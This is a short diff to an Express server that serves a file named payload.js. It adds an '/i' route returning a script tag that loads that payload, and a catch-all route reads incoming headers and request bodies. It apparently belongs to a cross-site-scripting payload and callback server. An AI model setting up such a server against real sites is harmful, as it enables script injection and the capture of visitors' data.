@@ -183,6 +183,10 @@ app.all("/", (req, res) => {
     res.sendFile(path.join(__dirname + "/payload.js"));
 });
 
+app.all("/i", (req, res) => {
+    res.send("<script src='/'></script>");
+});
+
 app.all("/*", (req, res) => {
     var headers = req.headers;
     var data = req.body;
@@ -206,6 +210,6 @@ app.all("/*", (req, res) => {
 });
 
 app.listen(port, (err) => {
-    //if (err) throw err;
+    if (err) throw err;
     console.log(`> Ready On Server http://localhost:${port}`);
 });
